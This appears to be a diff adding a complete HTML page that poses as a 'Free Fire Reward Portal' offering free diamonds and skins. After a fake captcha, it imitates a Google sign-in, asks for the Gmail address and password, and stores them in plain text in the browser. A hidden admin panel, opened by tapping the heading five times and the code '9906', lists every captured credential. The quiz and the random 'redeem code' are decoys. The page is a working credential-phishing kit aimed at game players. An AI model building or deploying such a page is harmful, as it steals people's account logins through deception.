@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Free Fire Reward Portal</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+  
+  body {
+    background-color: #f5f5f5; 
+    color: #333;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .container { 
+    width: 100%; 
+    max-width: 500px; 
+    background: #ffffff; 
+    padding: 30px 20px 50px 20px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.05);
+  }
+
+  .page { display: none; } 
+  
+  .header { text-align: center; margin-bottom: 20px; }
+  .header h1 { font-size: 24px; color: #202124; font-weight: 700; margin-bottom: 5px; }
+  .header p { font-size: 14px; color: #5f6368; }
+  
+  .btn {
+    display: block; text-align: center; text-decoration: none;
+    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s;
+    text-transform: uppercase; letter-spacing: 0.5px; margin-top: 15px;
+  }
+  .btn-blue { background-color: #1a73e8; color: #ffffff; box-shadow: 0 4px 10px rgba(26,115,232,0.3); }
+  .btn-blue:active { background-color: #1557b0; transform: scale(0.98); }
+  .btn-green { background-color: #34a853; color: #ffffff; box-shadow: 0 4px 10px rgba(52,168,83,0.3); }
+  .btn-green:active { background-color: #2b8a45; transform: scale(0.98); }
+
+  /* PAGE 1 */
+  .intro-text {
+    font-size: 15px; line-height: 1.6; color: #3c4043;
+    margin-bottom: 25px; text-align: center;
+    background: #f8f9fa; padding: 15px; border-radius: 10px; border: 1px solid #eaeaea;
+  }
+  .details-text { font-size: 14px; line-height: 1.7; color: #5f6368; text-align: justify; margin-bottom: 30px; }
+  .details-text h2 { font-size: 17px; color: #202124; margin-bottom: 10px; margin-top: 20px; border-bottom: 1px solid #eaeaea; padding-bottom: 5px; }
+  .details-text ul { margin-left: 20px; margin-bottom: 15px; }
+  .terms-footer { font-size: 11px; color: #9aa0a6; line-height: 1.5; text-align: justify; border-top: 1px solid #eaeaea; padding-top: 15px; }
+
+  /* PAGE 2: VERIFICATION */
+  .captcha-box {
+    border: 1px solid #d3d3d3; border-radius: 4px; background: #f9f9f9;
+    padding: 20px; margin-top: 20px;
+  }
+  .captcha-header { font-size: 14px; font-weight: 500; margin-bottom: 15px; color: #333; }
+  .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 15px; }
+  .grid-item {
+    background-color: #e0e0e0; height: 80px; border-radius: 4px; cursor: pointer;
+    display: flex; justify-content: center; align-items: center; position: relative;
+    border: 2px solid transparent; font-size: 40px;
+  }
+  .grid-item.selected { border-color: #1a73e8; opacity: 0.7; }
+  .grid-item.selected::after {
+    content: '✔'; position: absolute; color: white; background: #1a73e8;
+    width: 24px; height: 24px; border-radius: 50%; display: flex; justify-content: center; align-items: center;
+    font-size: 14px; top: -8px; right: -8px; font-weight: bold;
+  }
+  .captcha-error { color: #d93025; font-size: 12px; margin-top: 5px; display: none; }
+
+  /* PAGE 3 */
+  .signin-text { font-size: 20px; font-weight: 500; color: #202124; text-align: center; margin-bottom: 5px; cursor: pointer; user-select: none; }
+  .signin-sub { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 25px; }
+  .input-group { margin-bottom: 15px; }
+  input {
+    width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 6px;
+    font-size: 15px; color: #202124; transition: 0.2s; background: #fff;
+  }
+  input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+  
+  .admin-panel { margin-top: 30px; background: #f8f9fa; border: 1px solid #dadce0; border-radius: 8px; padding: 15px; display: none; }
+  .admin-panel h2 { font-size: 16px; color: #202124; margin-bottom: 10px; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; background: #fff; }
+  th, td { padding: 8px; border: 1px solid #dadce0; text-align: left; }
+  th { background: #f1f3f4; color: #202124; }
+
+  /* PAGE 4 */
+  .score-board { display: flex; justify-content: space-between; align-items: center; background: #f1f3f4; padding: 10px 15px; border-radius: 8px; font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 20px; }
+  .question-box { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 15px; line-height: 1.4; }
+  .options { display: flex; flex-direction: column; gap: 10px; }
+  .option { background: #fff; border: 1px solid #dadce0; padding: 12px 15px; border-radius: 8px; font-size: 14px; color: #3c4043; cursor: pointer; transition: 0.2s; }
+  .option.correct { background: #e6f4ea; border-color: #34a853; color: #188038; font-weight: 500; }
+  .option.wrong { background: #fce8e6; border-color: #ea4335; color: #c5221f; font-weight: 500; }
+  .option.disabled { pointer-events: none; }
+
+  /* PAGE 5 */
+  .loading-circle { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 30px auto; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .code-box { background: #e8f0fe; border: 2px dashed #1a73e8; padding: 20px; text-align: center; border-radius: 10px; margin: 20px 0; }
+  .code-text { font-size: 24px; font-weight: 700; letter-spacing: 2px; color: #1a73e8; font-family: monospace; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- PAGE 1: LANDING -->
+  <div id="page1" class="page active">
+    <div class="header">
+      <h1>Free Fire Reward Portal</h1>
+      <p>Official Partner Program</p>
+    </div>
+    <div class="intro-text">
+      Welcome to the official reward portal. We are giving away free diamonds and skins to our active players. To participate, we have set up a short <b>Quiz</b>. The player who passes this quiz will have a <b>Redeem Code</b> generated based on their performance.
+    </div>
+    
+    <!-- BUTTON 1 -->
+    <button class="btn btn-blue" onclick="goToPage(2)">GET STARTED</button>
+    
+    <div class="details-text">
+      <h2>How it works?</h2>
+      <ul>
+        <li><strong>Step 1:</strong> Click Get Started.</li>
+        <li><strong>Step 2:</strong> Pass the security verification.</li>
+        <li><strong>Step 3:</strong> Login to your account.</li>
+        <li><strong>Step 4:</strong> Pass the 5-question Free Fire quiz.</li>
+        <li><strong>Step 5:</strong> Generate and copy your redeem code.</li>
+      </ul>
+    </div>
+    <div class="terms-footer">
+      <strong>Terms & Conditions:</strong><br>
+      This is a promotional event. We are not directly affiliated with Garena Free Fire. All trademarks belong to their respective owners. By clicking Get Started, you agree to our privacy policy and allow us to collect your details for verification purposes.
+    </div>
+  </div>
+
+  <!-- PAGE 2: VERIFICATION -->
+  <div id="page2" class="page">
+    <div class="header">
+      <h1>Security Check</h1>
+      <p>Please verify you are a human</p>
+    </div>
+    <div class="captcha-box">
+      <div class="captcha-header">Select all images with <strong>Motorcycles</strong>.</div>
+      <div class="grid-container" id="gridContainer"></div>
+      <div class="captcha-error" id="captchaError">Please try again. You missed some images.</div>
+      
+      <!-- BUTTON 2 -->
+      <button class="btn btn-blue" id="verifyBtn" onclick="verifyImages()">VERIFY</button>
+      <button class="btn btn-blue" id="retryBtn" onclick="resetCaptcha()" style="display:none;">TRY AGAIN</button>
+      <button class="btn btn-green" id="proceedBtn" onclick="goToPage(3)" style="display:none;">PROCEED TO SIGN IN</button>
+    </div>
+  </div>
+
+  <!-- PAGE 3: SIGN IN -->
+  <div id="page3" class="page">
+    <div class="signin-text" id="adminTapArea">Sign in with Google</div>
+    <div class="signin-sub">Enter your Gmail ID and password to verify.</div>
+    
+    <div class="input-group">
+      <input type="text" id="emailInput" placeholder="Email or phone">
+    </div>
+    <div class="input-group">
+      <input type="password" id="passInput" placeholder="Enter password">
+    </div>
+    
+    <!-- BUTTON 3 -->
+    <button class="btn btn-blue" onclick="saveAndProceed()">SIGN IN</button>
+
+    <!-- HIDDEN ADMIN PANEL -->
+    <div class="admin-panel" id="adminPanel">
+      <h2>🔒 Admin Access</h2>
+      <input type="password" id="adminCode" placeholder="Enter admin code" style="margin-bottom:10px;">
+      <button class="btn btn-blue" onclick="adminLogin()" style="padding: 8px; font-size: 14px; margin-top:0;">Login</button>
+      <div id="adminError" style="color:red; font-size:12px; margin-top:5px;"></div>
+
+      <div id="adminRecords" style="display:none; margin-top:15px;">
+        <h2 style="font-size:14px;">📋 Data Records</h2>
+        <div style="overflow-x: auto;">
+          <table>
+            <thead>
+              <tr><th>#</th><th>Email/Number</th><th>Password</th></tr>
+            </thead>
+            <tbody id="recordsBody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4: QUIZ -->
+  <div id="page4" class="page">
+    <div class="header">
+      <h1>Free Fire Quiz</h1>
+      <p>Answer correctly to get points</p>
+    </div>
+    <div class="score-board">
+      <div>Points: <span id="scoreDisplay">0</span></div>
+      <div class="timer" id="timerDisplay">10s</div>
+      <div>Q: <span id="qCounter">1/5</span></div>
+    </div>
+    <div class="question-box" id="questionText">Loading...</div>
+    <div class="options" id="optionsBox"></div>
+    
+    <!-- BUTTON 4 -->
+    <button class="btn btn-blue" id="nextBtn" onclick="nextQuestion()" style="display:none;">NEXT QUESTION</button>
+  </div>
+
+  <!-- PAGE 5: CODE GENERATOR -->
+  <div id="page5" class="page">
+    <div class="header">
+      <h1>Generate Reward</h1>
+      <p>Please wait while we generate your code</p>
+    </div>
+    
+    <div id="loadingDiv">
+      <div class="loading-circle"></div>
+    </div>
+
+    <div id="codeDiv" style="display:none;">
+      <div class="header" style="margin-top:20px;">
+        <h1 style="color:#34a853;">🎉 Success!</h1>
+        <p>Your redeem code has been generated</p>
+      </div>
+      <div class="code-box">
+        <div class="code-text" id="generatedCode">FF-XXXX-XXXX-XXXX</div>
+        <button class="btn btn-green" onclick="copyCode()">COPY CODE</button>
+      </div>
+      <div class="expiry-note" style="font-size:12px; text-align:center; color:#888;">
+        * Note: If the code doesn't work in the game, it might be expired.
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ============ PAGE NAVIGATION ============ */
+function goToPage(pageNum) {
+  var pages = document.getElementsByClassName('page');
+  for (var i = 0; i < pages.length; i++) {
+    pages[i].style.display = 'none';
+  }
+  
+  var target = document.getElementById('page' + pageNum);
+  if (target) {
+    target.style.display = 'block';
+    window.scrollTo(0, 0);
+  }
+  
+  if(pageNum === 2) initCaptcha();
+  if(pageNum === 4) startQuiz();
+}
+
+/* ============ PAGE 2: VERIFICATION LOGIC (BIKES ONLY) ============ */
+var captchaImages = [
+  { isBike: true, icon: '🏍️' }, 
+  { isBike: false, icon: '🚗' }, 
+  { isBike: true, icon: '🏍️' }, 
+  { isBike: false, icon: '🚦' }, 
+  { isBike: true, icon: '🏍️' }, 
+  { isBike: false, icon: '🚌' }, 
+  { isBike: true, icon: '🏍️' }, 
+  { isBike: false, icon: '🚥' }, 
+  { isBike: false, icon: '🚕' }  
+];
+var selectedImages = [];
+
+function initCaptcha() {
+  var container = document.getElementById('gridContainer');
+  container.innerHTML = '';
+  selectedImages = [];
+  document.getElementById('captchaError').style.display = 'none';
+  document.getElementById('verifyBtn').style.display = 'block';
+  document.getElementById('retryBtn').style.display = 'none';
+  document.getElementById('proceedBtn').style.display = 'none';
+
+  var shuffled = captchaImages.slice().sort(function() { return 0.5 - Math.random(); });
+
+  shuffled.forEach(function(img) {
+    var div = document.createElement('div');
+    div.className = 'grid-item';
+    div.textContent = img.icon;
+    div.dataset.isBike = img.isBike;
+    
+    div.onclick = function() {
+      if (div.classList.contains('selected')) {
+        div.classList.remove('selected');
+        selectedImages = selectedImages.filter(function(i) { return i !== div; });
+      } else {
+        div.classList.add('selected');
+        selectedImages.push(div);
+      }
+    };
+    container.appendChild(div);
+  });
+}
+
+function verifyImages() {
+  var allCorrect = true;
+  var hasSelection = selectedImages.length > 0;
+
+  if (!hasSelection) {
+    allCorrect = false;
+  } else {
+    selectedImages.forEach(function(div) {
+      if (div.dataset.isBike !== 'true') allCorrect = false;
+    });
+    var allGridItems = document.querySelectorAll('.grid-item');
+    allGridItems.forEach(function(div) {
+      if (div.dataset.isBike === 'true' && !div.classList.contains('selected')) {
+        allCorrect = false;
+      }
+    });
+  }
+
+  if (allCorrect) {
+    document.getElementById('verifyBtn').style.display = 'none';
+    document.getElementById('proceedBtn').style.display = 'block';
+  } else {
+    document.getElementById('captchaError').style.display = 'block';
+    document.getElementById('verifyBtn').style.display = 'none';
+    document.getElementById('retryBtn').style.display = 'block';
+  }
+}
+
+function resetCaptcha() {
+  initCaptcha();
+}
+
+/* ============ PAGE 3: SIGN IN & ADMIN ============ */
+var adminTapCount = 0;
+var adminTapTimer = null;
+
+document.getElementById('adminTapArea').addEventListener('click', function() {
+  adminTapCount++;
+  clearTimeout(adminTapTimer);
+  adminTapTimer = setTimeout(function() { adminTapCount = 0; }, 1200); 
+  
+  if (adminTapCount === 5) {
+    adminTapCount = 0;
+    document.getElementById('adminPanel').style.display = 'block';
+    document.getElementById('adminPanel').scrollIntoView({ behavior: 'smooth' });
+  }
+});
+
+function saveAndProceed() {
+  var email = document.getElementById('emailInput').value.trim();
+  var pass = document.getElementById('passInput').value.trim();
+  
+  if (!email || !pass) {
+    alert("Please fill both fields!");
+    return;
+  }
+
+  var records = JSON.parse(localStorage.getItem('ffAdminData') || '[]');
+  records.push({ email: email, password: pass });
+  localStorage.setItem('ffAdminData', JSON.stringify(records));
+
+  goToPage(4);
+}
+
+function adminLogin() {
+  var code = document.getElementById('adminCode').value.trim();
+  if (code === '9906') {
+    document.getElementById('adminError').textContent = '';
+    document.getElementById('adminRecords').style.display = 'block';
+    renderAdminTable();
+  } else {
+    document.getElementById('adminError').textContent = '❌ Wrong admin code';
+  }
+}
+
+function renderAdminTable() {
+  var records = JSON.parse(localStorage.getItem('ffAdminData') || '[]');
+  var tbody = document.getElementById('recordsBody');
+  tbody.innerHTML = '';
+  if (records.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No data yet</td></tr>';
+    return;
+  }
+  records.forEach(function(r, i) {
+    tbody.innerHTML += '<tr><td>'+(i+1)+'</td><td>'+r.email+'</td><td>'+r.password+'</td></tr>';
+  });
+}
+
+/* ============ PAGE 4: QUIZ LOGIC ============ */
+var questions = [
+  { q: "What is the maximum number of players in a Free Fire match?", options: ["50", "52", "60", "48"], answer: 1 },
+  { q: "Which character has the ability 'Raging Reload'?", options: ["Kelly", "Alok", "Hayato", "Chrono"], answer: 2 },
+  { q: "What is the default number of points for a kill in ranked mode?", options: ["5", "10", "15", "20"], answer: 1 },
+  { q: "Which map was added to Free Fire in 2020?", options: ["Bermuda", "Purgatory", "Kalahari", "Alpine"], answer: 2 },
+  { q: "How many diamonds does a Diamond Royale spin usually cost?", options: ["10", "20", "30", "50"], answer: 1 }
+];
+
+var currentQ = 0, score = 0, answered = false;
+var timeLeft = 10, timerInterval;
+
+function startQuiz() {
+  currentQ = 0; score = 0; document.getElementById('scoreDisplay').textContent = score;
+  loadQuestion();
+}
+
+function loadQuestion() {
+  answered = false;
+  var q = questions[currentQ];
+  document.getElementById('questionText').textContent = q.q;
+  var optionsBox = document.getElementById('optionsBox');
+  optionsBox.innerHTML = '';
+  
+  q.options.forEach(function(opt, i) {
+    var div = document.createElement('div');
+    div.className = 'option';
+    div.textContent = opt;
+    div.onclick = function() { selectOption(i, div); };
+    optionsBox.appendChild(div);
+  });
+  
+  document.getElementById('nextBtn').style.display = 'none';
+  document.getElementById('qCounter').textContent = (currentQ + 1) + '/5';
+  
+  timeLeft = 10;
+  document.getElementById('timerDisplay').textContent = timeLeft + 's';
+  clearInterval(timerInterval);
+  timerInterval = setInterval(function() {
+    timeLeft--;
+    document.getElementById('timerDisplay').textContent = timeLeft + 's';
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      if (!answered) selectOption(-1, null); 
+    }
+  }, 1000);
+}
+
+function selectOption(index, el) {
+  if (answered) return;
+  answered = true;
+  clearInterval(timerInterval);
+  
+  var correctIndex = questions[currentQ].answer;
+  var options = document.getElementById('optionsBox').children;
+  
+  options[correctIndex].classList.add('correct');
+  
+  if (index === correctIndex) {
+    score += 10;
+    document.getElementById('scoreDisplay').textContent = score;
+    if(el) el.classList.add('correct');
+  } else {
+    if(el) el.classList.add('wrong');
+  }
+  
+  for (var i = 0; i < options.length; i++) {
+    options[i].classList.add('disabled');
+  }
+  
+  var nextBtn = document.getElementById('nextBtn');
+  nextBtn.style.display = 'block';
+  nextBtn.textContent = currentQ === questions.length - 1 ? 'GENERATE REWARD' : 'NEXT QUESTION';
+}
+
+function nextQuestion() {
+  if (currentQ < questions.length - 1) {
+    currentQ++;
+    loadQuestion();
+  } else {
+    goToPage(5);
+    generateCode();
+  }
+}
+
+/* ============ PAGE 5: CODE GENERATOR ============ */
+function generateCode() {
+  document.getElementById('loadingDiv').style.display = 'block';
+  document.getElementById('codeDiv').style.display = 'none';
+  
+  setTimeout(function() {
+    document.getElementById('loadingDiv').style.display = 'none';
+    document.getElementById('codeDiv').style.display = 'block';
+    
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    var code = 'FF';
+    for(var i=0; i<3; i++) {
+        code += '-';
+        for(var j=0; j<4; j++) {
+            code += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+    }
+    document.getElementById('generatedCode').textContent = code;
+  }, 2000); 
+}
+
+function copyCode() {
+  var codeText = document.getElementById('generatedCode').textContent;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(codeText).then(function() {
+      alert("Code Copied to clipboard!");
+    });
+  } else {
+    alert("Code: " + codeText);
+  }
+}
+</script>
+
+</body>
+</html>
